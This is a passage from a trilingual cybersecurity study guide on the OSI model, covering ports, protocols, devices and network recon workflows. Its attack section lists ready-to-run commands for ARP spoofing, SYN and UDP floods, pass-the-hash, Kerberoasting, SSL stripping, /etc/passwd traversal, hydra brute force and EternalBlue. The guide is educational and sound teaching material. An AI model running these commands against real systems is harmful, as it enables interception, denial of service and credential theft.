# udp.port == 67     → DHCP server
# udp.port == 68     → DHCP client

# Test TCP vs UDP response
$ nmap -sT 192.168.1.1 -p 80   # TCP
$ nmap -sU 192.168.1.1 -p 53   # UDP

# UDP flood detection
$ netstat -su    # UDP statistics (errors = possible flood)
```

### TCP vs UDP — Full Comparison Table

| Aspect | TCP | UDP | 🇮🇩 Catatan | 🇬🇧 Notes | 🇯🇵 メモ |
|--------|-----|-----|-----------|---------|--------|
| PDU Name | Segment | Datagram | Unit data | Data unit | データ単位 |
| Header Size | 20–60 bytes | 8 bytes | — | — | — |
| Handshake | 3-way (SYN/SYN-ACK/ACK) | None | — | — | — |
| Reliability | ✅ Yes | ❌ No | ACK setiap paket | ACK per packet | パケットごとACK |
| Ordering | ✅ Yes (SEQ numbers) | ❌ No | — | — | — |
| Flow Control | ✅ Yes (windowing) | ❌ No | — | — | — |
| Error Recovery | ✅ Yes (retransmit) | ❌ No | — | — | — |
| Speed | Slower | Faster | Overhead banyak | High overhead | オーバーヘッド多 |
| Broadcast | ❌ No | ✅ Yes | Tidak bisa | Not supported | サポートなし |
| Multicast | ❌ No | ✅ Yes | — | — | — |
| Use Cases | HTTP, SSH, FTP, SMTP | DNS, DHCP, VoIP, Gaming | — | — | — |

---

## 11. 🔌 Common Ports — Port Reference

### 🇮🇩 Bahasa Indonesia
**Port** adalah nomor logis (0–65535) yang mengidentifikasi layanan atau aplikasi spesifik dalam sebuah host. Ada tiga kategori:
- **Well-Known Ports (0–1023)** — standar, memerlukan hak root
- **Registered Ports (1024–49151)** — terdaftar ke IANA
- **Dynamic/Private Ports (49152–65535)** — digunakan sementara

### 🇬🇧 English
**Ports** are logical numbers (0–65535) that identify specific services or applications within a host. There are three categories:
- **Well-Known Ports (0–1023)** — standardized, require root privileges
- **Registered Ports (1024–49151)** — registered with IANA
- **Dynamic/Private Ports (49152–65535)** — used temporarily

### 🇯🇵 日本語
**ポート**はホスト内の特定のサービスやアプリケーションを識別する論理番号（0〜65535）です。3つのカテゴリがあります：
- **ウェルノウンポート（0〜1023）** — 標準化、root権限が必要
- **登録済みポート（1024〜49151）** — IANAに登録済み
- **動的/プライベートポート（49152〜65535）** — 一時的に使用

```bash
# Port scanning cheatsheet

# Quick common ports scan
$ nmap -p 21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 target

# Top 1000 ports (default nmap)
$ nmap target

# All ports
$ nmap -p- target

# Service version + OS detection + scripts
$ nmap -sV -O -sC target

# Aggressive scan (combine all)
$ nmap -A target

# Fast scan
$ nmap -F target

# Check if specific port is open with nc
$ nc -zv target.com 22       # SSH
$ nc -zv target.com 3389     # RDP
$ nc -zv target.com 445      # SMB
```

### 📊 Critical Ports Reference Table

| Port | Protocol | Service | 🔴 Pentest Risk | 🇮🇩 Catatan | 🇬🇧 Notes |
|------|----------|---------|----------------|-----------|---------|
| **21** | TCP | FTP | 🔴 Critical | Cleartext, anonymous login | Cleartext, anon login |
| **22** | TCP | SSH | 🟠 High | Brute force, key auth | Brute force, key auth |
| **23** | TCP | Telnet | 🔴 Critical | Cleartext, deprecated | Cleartext, deprecated |
| **25** | TCP | SMTP | 🟠 High | User enum, relay abuse | User enum, relay |
| **53** | TCP/UDP | DNS | 🔴 High | Zone transfer, DNS poison | Zone xfer, poisoning |
| **67/68** | UDP | DHCP | 🟠 High | Rogue DHCP, starvation | Rogue DHCP |
| **80** | TCP | HTTP | 🔴 High | Web attacks, SQLi, XSS | Web attacks |
| **88** | TCP/UDP | Kerberos | 🔴 Critical | AS-REP Roasting, Kerberoasting | Kerberos attacks |
| **110** | TCP | POP3 | 🟡 Medium | Cleartext credentials | Cleartext creds |
| **111** | TCP/UDP | RPC/rpcbind | 🟠 High | NFS enumeration | NFS enum |
| **135** | TCP | MS-RPC | 🟠 High | DCOM attacks | DCOM attacks |
| **139** | TCP | NetBIOS | 🔴 High | SMB, null sessions | SMB, null sessions |
| **143** | TCP | IMAP | 🟡 Medium | Cleartext credentials | Cleartext creds |
| **161/162** | UDP | SNMP | 🔴 High | Community string, info leak | Community string |
| **389** | TCP | LDAP | 🔴 High | AD enumeration, null bind | AD enum |
| **443** | TCP | HTTPS | 🟠 High | Web attacks via HTTPS | Web attacks |
| **445** | TCP | SMB | 🔴 Critical | EternalBlue, pass-the-hash | EternalBlue, PTH |
| **512/513/514** | TCP | r-services | 🔴 Critical | No auth, legacy | No auth, legacy |
| **873** | TCP | rsync | 🔴 High | Unauth file access | Unauth access |
| **993** | TCP | IMAPS | 🟢 Low | Encrypted IMAP | Encrypted |
| **995** | TCP | POP3S | 🟢 Low | Encrypted POP3 | Encrypted |
| **1433** | TCP | MSSQL | 🔴 High | SA account, xp_cmdshell | SA, xp_cmdshell |
| **1521** | TCP | Oracle DB | 🔴 High | Default SID, credentials | Default SID |
| **2049** | TCP/UDP | NFS | 🔴 High | No auth mount, root squash | Unauth mount |
| **3306** | TCP | MySQL | 🔴 High | Root no password | Root no pass |
| **3389** | TCP | RDP | 🔴 Critical | BlueKeep, brute force | BlueKeep, brute |
| **5432** | TCP | PostgreSQL | 🟠 High | Default credentials | Default creds |
| **5900** | TCP | VNC | 🔴 High | Weak/no auth | Weak auth |
| **6379** | TCP | Redis | 🔴 Critical | No auth, RCE via config | No auth, RCE |
| **8080** | TCP | HTTP-alt | 🔴 High | Dev servers, admin panels | Dev/admin panel |
| **8443** | TCP | HTTPS-alt | 🟠 High | Admin panels | Admin panels |
| **27017** | TCP | MongoDB | 🔴 Critical | No auth default | No auth default |

---

## 12. 🔧 Protokol per Layer — Protocols per Layer

```
┌───────────────────────────────────────────────────────────────────┐
│ LAYER 7 — APPLICATION                                             │
│  HTTP  HTTPS  FTP  SFTP  SSH  Telnet  DNS  DHCP  SMTP  POP3      │
│  IMAP  SNMP  LDAP  RDP  SMB  NFS  SIP  XMPP  MQTT  Gopher       │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 6 — PRESENTATION                                            │
│  SSL  TLS  ASCII  Unicode  JPEG  PNG  GIF  MPEG  MIDI            │
│  Base64  MIME  XDR  AFP  LPP                                     │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 5 — SESSION                                                 │
│  NetBIOS  RPC  PPTP  L2TP  SQL*Net  NFS  SMB (session mgmt)      │
│  iSCSI  SOCKS  PAP  CHAP  Diameter                               │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 4 — TRANSPORT                                               │
│  TCP  UDP  SCTP  DCCP  SPX  QUIC                                 │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 3 — NETWORK                                                 │
│  IPv4  IPv6  ICMP  ICMPv6  OSPF  BGP  EIGRP  RIP                │
│  IPSec  ARP*  RARP*  NAT  IGMP  GRE  MPLS                       │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 2 — DATA LINK                                               │
│  Ethernet  Wi-Fi (802.11)  PPP  HDLC  Frame Relay                │
│  ATM  802.1Q (VLAN)  STP  LACP  ARP  MAC                        │
├───────────────────────────────────────────────────────────────────┤
│ LAYER 1 — PHYSICAL                                                │
│  Ethernet (cable specs)  USB  DSL  ISDN  T1/E1                   │
│  Bluetooth  802.11 (radio)  Fiber Optic standards                 │
└───────────────────────────────────────────────────────────────────┘

* ARP technically operates between Layer 2 and 3
```

---

## 13. 🖥️ Network Devices — Perangkat Jaringan per Layer

### 🇮🇩 Bahasa Indonesia
Setiap perangkat jaringan beroperasi pada layer OSI tertentu — memahami ini penting untuk **network segmentation**, **troubleshooting**, dan **network-level attacks**.

### 🇬🇧 English
Each network device operates at a specific OSI layer — understanding this is critical for **network segmentation**, **troubleshooting**, and **network-level attacks**.

### 🇯🇵 日本語
各ネットワーク機器は特定のOSI層で動作します — これを理解することは**ネットワークセグメンテーション**、**トラブルシューティング**、**ネットワークレベルの攻撃**にとって重要です。

| OSI Layer | 🇮🇩 Perangkat | 🇬🇧 Devices | 🇯🇵 機器 | 🇮🇩 Fungsi | 🇬🇧 Function |
|-----------|-------------|-----------|---------|-----------|-------------|
| **Layer 7** | Application Firewall, WAF, Proxy, Load Balancer | Application Firewall, WAF, Proxy | アプリケーションファイアウォール、WAF、プロキシ | Filter HTTP, SSL inspection | Filter HTTP, SSL inspect |
| **Layer 4** | Stateful Firewall, Load Balancer | Stateful Firewall, Load Balancer | ステートフルファイアウォール | Filter berdasarkan port & koneksi | Port & connection filtering |
| **Layer 3** | Router, Layer 3 Switch, Firewall | Router, L3 Switch, Firewall | ルーター、L3スイッチ | Routing antar jaringan | Inter-network routing |
| **Layer 2** | Switch (L2), Bridge, WAP | Switch (L2), Bridge, WAP | L2スイッチ、ブリッジ | Switching berdasarkan MAC | MAC-based switching |
| **Layer 1** | Hub, Repeater, Cable, NIC, WAP | Hub, Repeater, Cable, NIC | ハブ、リピーター、ケーブル | Transmisi sinyal fisik | Physical signal transmission |

```bash
# Identify network devices during pentest

# Identify routers / gateways
$ ip route | grep default          # default gateway = router
$ arp -a                           # ARP table shows local devices

# Scan for specific devices
$ nmap -sV --version-intensity 5 192.168.1.0/24

# Identify switches (CDP/LLDP discovery)
$ nmap --script lldp-discovery 192.168.1.0/24
$ wireshark → filter: lldp or cdp

# WAF detection
$ wafw00f https://target.com
$ nmap --script http-waf-detect --script-args="http-waf-detect.aggro" target.com

# Load balancer detection
$ lbd target.com                   # Load balancer detector

# Proxy detection
$ curl -v --proxy-header target.com  # look for Via: header
```

---

## 14. 🔐 Security Note — Attacks per OSI Layer

### 🇮🇩 Bahasa Indonesia
Setiap layer OSI memiliki **vektor serangan yang unik**. Memahami di layer mana suatu serangan terjadi membantu defender dalam menempatkan kontrol keamanan yang tepat, dan membantu attacker dalam memilih teknik yang efektif.

### 🇬🇧 English
Each OSI layer has **unique attack vectors**. Understanding at which layer an attack occurs helps defenders place the right security controls, and helps attackers choose effective techniques.

### 🇯🇵 日本語
各OSI層には**独自の攻撃ベクター**があります。攻撃がどの層で発生するかを理解することは、ディフェンダーが適切なセキュリティコントロールを配置するのに役立ち、アタッカーが効果的なテクニックを選ぶのにも役立ちます。

```bash
# ── LAYER 1 ATTACKS ─────────────────────────────────────────────────

# Physical tapping / eavesdropping
# → Use encrypted protocols (HTTPS, SSH, VPN) to mitigate

# Evil twin Wi-Fi (physical signal)
$ airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# ── LAYER 2 ATTACKS ─────────────────────────────────────────────────

# ARP Spoofing / Poisoning — MITM at Layer 2
$ arpspoof -i eth0 -t 192.168.1.100 192.168.1.1     # poison victim
$ arpspoof -i eth0 -t 192.168.1.1 192.168.1.100     # poison gateway
$ echo 1 > /proc/sys/net/ipv4/ip_forward             # enable forwarding
# Or use:
$ ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
$ bettercap -iface eth0                               # modern MITM framework

# MAC Flooding — fill switch CAM table
$ macof -i eth0                   # flood switch with random MACs

# VLAN Hopping — 802.1Q double tagging
# Use tools like yersinia

# STP Attack — become root bridge
$ yersinia stp -attack 1 -interface eth0

# ── LAYER 3 ATTACKS ─────────────────────────────────────────────────

# ICMP Flood / Ping of Death
$ hping3 -1 --flood -V -a spoofed-ip target.com

# IP Spoofing
$ hping3 -a fake-source-ip target.com

# Smurf Attack (ICMP broadcast amplification)
# BGP Hijacking (requires BGP router access)

# Route poisoning
$ python3 -c "from scapy.all import *; send(IP(dst='router',proto=89)/OSPF_Hdr()/OSPF_Hello())"

# ── LAYER 4 ATTACKS ─────────────────────────────────────────────────

# SYN Flood — exhaust server connections
$ hping3 -S --flood -V -p 80 target.com
$ hping3 -S -P -U --flood -V -p 80 target.com

# Port scanning (reconnaissance)
$ nmap -sS -p- target.com

# TCP Session Hijacking
# → Requires MITM position + sequence number prediction

# UDP Flood
$ hping3 --udp --flood target.com -p 53

# ── LAYER 5 ATTACKS ─────────────────────────────────────────────────

# Session Hijacking — steal session tokens
# → Intercept cookies via HTTP (Wireshark / BetterCAP)

# Pass-the-Hash (Windows NTLM)
$ pth-winexe -U 'domain/user%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' //target cmd.exe
$ impacket-psexec domain/user@target -hashes :NTLM_HASH

# Kerberoasting (Kerberos ticket attack)
$ impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.1 -request

# ── LAYER 6 ATTACKS ─────────────────────────────────────────────────

# SSL Stripping — downgrade HTTPS to HTTP
$ bettercap -iface eth0
> set https.proxy.sslstrip true
> https.proxy on

# TLS Downgrade Attack
$ nmap --script ssl-dh-params target.com   # check for LOGJAM
$ nmap --script ssl-poodle target.com      # POODLE attack check

# Certificate spoofing / Invalid cert bypass
$ mitmproxy --ssl-insecure                 # intercept SSL
$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365

# ── LAYER 7 ATTACKS ─────────────────────────────────────────────────

# SQL Injection
$ sqlmap -u "http://target.com/page?id=1" --dbs
$ sqlmap -u "http://target.com/" --forms --dbs --level=5

# Cross-Site Scripting (XSS)
# Test: <script>alert(document.cookie)</script>

# Directory Traversal
$ curl "http://target.com/../../etc/passwd"

# HTTP brute force
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# DNS Zone Transfer
$ dig axfr @ns1.target.com target.com

# SMTP User Enumeration
$ smtp-user-enum -M VRFY -U users.txt -t target.com

# SNMP Enumeration
$ snmpwalk -c public -v 2c target.com

# SMB Exploitation
$ impacket-psexec administrator:password@target.com
$ metasploit → use exploit/windows/smb/ms17_010_eternalblue
```

### 📊 OSI Attack Summary Table

| Layer | 🇮🇩 Serangan Umum | 🇬🇧 Common Attacks | 🇯🇵 一般的な攻撃 | Defense |
|-------|-----------------|------------------|---------------|---------|
| **7 — App** | SQLi, XSS, RCE, CSRF, Phishing | SQLi, XSS, RCE, CSRF, Phishing | SQLi、XSS、RCE、CSRF | WAF, input validation, patching |
| **6 — Pres** | SSL Stripping, TLS Downgrade, Cert Spoof | SSL Strip, TLS Downgrade | SSLストリッピング、TLSダウングレード | HSTS, cert pinning, TLS 1.3+ |
| **5 — Session** | Session Hijack, Pass-the-Hash, Kerberoast | Session Hijack, PTH, Kerberoast | セッションハイジャック、PTH | Token rotation, MFA, Kerberos hardening |
| **4 — Transport** | SYN Flood, Port Scan, UDP Flood | SYN Flood, Port Scan | SYNフラッド、ポートスキャン | SYN cookies, rate limiting, firewall |
| **3 — Network** | IP Spoof, ICMP Flood, Route Poison | IP Spoof, ICMP Flood | IPスプーフィング、ICMPフラッド | uRPF, ACL, ICMP rate limit |
| **2 — Data Link** | ARP Spoof, MAC Flood, VLAN Hop | ARP Spoof, MAC Flood | ARPスプーフィング、MACフラッド | Dynamic ARP Inspection, port security |
| **1 — Physical** | Wiretapping, Evil Twin, Signal Jam | Wiretapping, Evil Twin | 盗聴、イービルツイン | Physical security, encrypted protocols |

---

## 15. 🔄 Practical Workflow — Network Recon & Analysis

```bash
# ── SCENARIO: Network Penetration Testing — OSI-based Approach ──────

# ═══ PHASE 1: LAYER 1-2 — Physical & Data Link Recon ════════════════

# 1. Identify your network interface
$ ip link show
$ ip addr show

# 2. Put interface in promiscuous mode (passive sniffing)
$ ip link set eth0 promisc on
$ tcpdump -i eth0 -n -e           # capture with MAC addresses

# 3. ARP scan — discover all hosts on segment
$ arp-scan --localnet             # or:
$ nmap -sn -PR 192.168.1.0/24    # ARP ping sweep

# 4. Check for ARP anomalies
$ arpwatch -i eth0                # monitor ARP changes
$ tcpdump -i eth0 arp             # watch ARP traffic live

# ═══ PHASE 2: LAYER 3 — Network Discovery ════════════════════════════

# 5. ICMP ping sweep
$ nmap -sn 192.168.1.0/24        # host discovery
$ fping -a -g 192.168.1.0/24 2>/dev/null

# 6. TTL-based OS detection
$ ping -c 1 target | grep ttl
# TTL 64  → Linux/Unix
# TTL 128 → Windows
# TTL 255 → Network device (Cisco, etc.)

# 7. Traceroute — map network topology
$ traceroute -n 10.0.0.1
$ mtr --report 10.0.0.1

# ═══ PHASE 3: LAYER 4 — Port & Service Scanning ══════════════════════

# 8. Quick port scan
$ nmap -sS -F --open 192.168.1.0/24   # fast SYN scan, open ports only

# 9. Full port scan on discovered hosts
$ nmap -sS -p- -T4 target.com

# 10. UDP scan (slow but important)
$ nmap -sU --top-ports 100 target.com

# 11. Service version detection
$ nmap -sV -sC -p 22,80,443,445 target.com

# ═══ PHASE 4: LAYER 5-6 — Session & Protocol Analysis ════════════════

# 12. Check SSL/TLS configurations
$ sslscan target.com
$ nmap --script ssl-enum-ciphers -p 443 target.com
$ openssl s_client -connect target.com:443

# 13. Check for session management issues
# Burp Suite → Intercept → check session tokens

# 14. SMB/NetBIOS enumeration
$ enum4linux -a target.com
$ smbmap -H target.com
$ smbclient -L //target.com -N

# ═══ PHASE 5: LAYER 7 — Application Enumeration ══════════════════════

# 15. HTTP enumeration
$ curl -s -I http://target.com              # headers
$ whatweb http://target.com                 # tech fingerprint
$ nikto -h http://target.com               # web vulnerability scan
$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 16. DNS enumeration
$ dig any target.com
$ dnsrecon -d target.com -t std
$ fierce --domain target.com

# 17. SNMP enumeration (if UDP 161 open)
$ snmpwalk -c public -v 2c target.com
$ snmpwalk -c public -v 2c target.com 1.3.6.1.2.1.1   # system info

# 18. LDAP enumeration (if port 389 open)
$ ldapsearch -H ldap://target.com -x -b "dc=target,dc=com"
$ nmap --script ldap-rootdse target.com

# ═══ ANALYSIS: Correlate findings across layers ═══════════════════════

# 19. Full comprehensive scan
$ nmap -A -sV -sC -O -p- --open target.com -oN full_scan.txt

# 20. Parse and organize results
$ grep "open" full_scan.txt | sort -t/ -k1 -n
```

### 🧠 OSI Troubleshooting Approach

```
Problem: Can't reach remote server?

Step 1 — Layer 1 (Physical):
  → Is cable plugged in? Link light on?
  $ ip link show eth0 | grep "state UP"

Step 2 — Layer 2 (Data Link):
  → Can you reach local gateway?
  $ arp -a | grep gateway-ip

Step 3 — Layer 3 (Network):
  → Can you ping gateway?
  $ ping 192.168.1.1
  → Can you ping remote IP?
  $ ping 8.8.8.8
  → Check routing table
  $ ip route show

Step 4 — Layer 4 (Transport):
  → Is the port open?
  $ nc -zv target 80
  $ nmap -p 80 target

Step 5 — Layer 5-6 (Session/Presentation):
  → SSL certificate valid?
  $ openssl s_client -connect target:443
  → Session timeout?

Step 6 — Layer 7 (Application):
  → HTTP response code?
  $ curl -v http://target
  → Application error?
  → Check application logs
```

---

## 🔗 OSI vs TCP/IP Model

```
OSI Model              TCP/IP Model (4-layer)     Protocols
─────────────          ──────────────────────     ─────────────────────────
Layer 7 — Application  ┐
Layer 6 — Presentation ├── Application Layer       HTTP, FTP, DNS, SMTP, SSH
Layer 5 — Session      ┘
─────────────          ──────────────────────     ─────────────────────────
Layer 4 — Transport    ─── Transport Layer         TCP, UDP, SCTP
─────────────          ──────────────────────     ─────────────────────────
Layer 3 — Network      ─── Internet Layer          IPv4, IPv6, ICMP, BGP
─────────────          ──────────────────────     ─────────────────────────
Layer 2 — Data Link    ┐
Layer 1 — Physical     ┴── Network Access Layer    Ethernet, Wi-Fi, ARP
```

---

## 🧠 Quick Reference Cheatsheet

```bash
# ── OSI LAYER MNEMONICS ────────────────────────────────────────────
# Top → Bottom:  "All People Seem To Need Data Processing"
# Bottom → Top:  "Please Do Not Throw Sausage Pizza Away"

# ── LAYER QUICK REFERENCE ─────────────────────────────────────────
# L7 Application  → HTTP, DNS, FTP, SSH, SMTP, SNMP, LDAP, RDP, SMB
# L6 Presentation → SSL/TLS, ASCII, Base64, JPEG, MIME
# L5 Session      → NetBIOS, RPC, SMB sessions, iSCSI
# L4 Transport    → TCP (reliable), UDP (fast)   [PORTS]
# L3 Network      → IPv4/IPv6, ICMP, OSPF, BGP   [IP ADDRESSES]
# L2 Data Link    → Ethernet, ARP, 802.1Q VLAN   [MAC ADDRESSES]
# L1 Physical     → Cables, signals, bits         [HARDWARE]

# ── PDU NAMES ─────────────────────────────────────────────────────
# L7-L5: Data
# L4:    Segment (TCP) / Datagram (UDP)
# L3:    Packet
# L2:    Frame
# L1:    Bits

# ── NETWORK RECON TOOLS ───────────────────────────────────────────
arp-scan --localnet           # Layer 2 discovery
nmap -sn 192.168.1.0/24      # Layer 3 host discovery
nmap -sS -p- target          # Layer 4 port scan
nmap -sV -sC target          # Layer 7 service detection
tcpdump -i eth0 -n           # Passive capture (all layers)
wireshark                    # GUI packet analysis

# ── ATTACK TOOLS BY LAYER ─────────────────────────────────────────
# L2: arpspoof, ettercap, bettercap, macof, yersinia
# L3: hping3, scapy, nmap
# L4: hping3, nmap, netcat, masscan
# L5: impacket, mimikatz, Responder
# L6: mitmproxy, sslstrip, sslscan, testssl.sh
# L7: sqlmap, nikto, gobuster, hydra, burpsuite

# ── DEFENSIVE TOOLS ───────────────────────────────────────────────
# L2: arpwatch, Dynamic ARP Inspection (DAI on switches)
# L3: uRPF, firewall ACL, fail2ban
# L4: SYN cookies, rate limiting, stateful firewall
# L5: Kerberos hardening, MFA, NTLM restrictions
# L6: HSTS, cert pinning, TLS 1.3, HPKP
# L7: WAF, input validation, CSP headers, SAST/DAST

# ── WIRESHARK FILTERS CHEATSHEET ──────────────────────────────────
ip.addr == 192.168.1.1         # filter by IP
ip.src == 10.0.0.0/8           # filter by subnet
tcp.port == 80                 # HTTP traffic
tcp.flags.syn == 1             # TCP SYN packets
tcp.flags.rst == 1             # TCP RST (port closed/reset)
udp.port == 53                 # DNS traffic
arp                            # ARP traffic only
http                           # HTTP traffic only
ssl or tls                     # SSL/TLS traffic
dns                            # DNS only
icmp                           # ICMP (ping) only
!(arp or dns or icmp)          # exclude noise

# ── PORT STATUS IN NMAP ────────────────────────────────────────────
# open         → service running, accepting connections
# closed       → port accessible, no service running (RST reply)
# filtered     → firewall blocking, no reply
# open|filtered → can't determine (UDP especially)
# unfiltered   → accessible, but state unknown

# ── COMMON NETWORK COMMANDS ───────────────────────────────────────
# Linux:
ip addr show; ip route show; ss -tulnp; arp -a; dig; traceroute

# Windows:
ipconfig /all; route print; netstat -ano; arp -a; nslookup; tracert
```

---

## 📊 Complete OSI Reference Table

| Layer | Name | PDU | Address | Devices | 🇮🇩 Protokol Utama | 🇬🇧 Key Protocols | 🇯🇵 主要プロトコル |
|-------|------|-----|---------|---------|-------------------|-----------------|-----------------|
| **7** | Application | Data | — | WAF, Proxy | HTTP, FTP, DNS, SSH | HTTP, FTP, DNS, SSH | HTTP、FTP、DNS、SSH |
| **6** | Presentation | Data | — | — | SSL/TLS, MIME | SSL/TLS, MIME | SSL/TLS、MIME |
| **5** | Session | Data | — | — | NetBIOS, RPC | NetBIOS, RPC | NetBIOS、RPC |
| **4** | Transport | Segment/Datagram | Port | Firewall | TCP, UDP | TCP, UDP | TCP、UDP |
| **3** | Network | Packet | IP Address | Router | IPv4, IPv6, ICMP | IPv4, IPv6, ICMP | IPv4、IPv6、ICMP |
| **2** | Data Link | Frame | MAC Address | Switch | Ethernet, ARP, 802.1Q | Ethernet, ARP | イーサネット、ARP |
| **1** | Physical | Bits | — | Hub, NIC | DSL, Ethernet (specs) | DSL, Ethernet | DSL、イーサネット |

---

> 📚 **References:**
> - [RFC 793 — Transmission Control Protocol](https://www.rfc-editor.org/rfc/rfc793)
> - [RFC 768 — User Datagram Protocol](https://www.rfc-editor.org/rfc/rfc768)
> - [HackTheBox Academy — Network Fundamentals](https://academy.hackthebox.com)
> - [Nmap Official Documentation](https://nmap.org/book/man.html)
> - [Wireshark Display Filters](https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html)
> - [IANA Port Number Registry](https://www.iana.org/assignments/service-names-port-numbers)
> - [PayloadsAllTheThings — Network](https://github.com/swisskyrepo/PayloadsAllTheThings)
> - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

> 🔖 **Repository:** [LearnCybersecurity](https://github.com/Kodokthegr3at/LearnCybersecurity)  
> 💬 **Feedback & Contributions welcome!** Open an issue or PR if you spot any errors.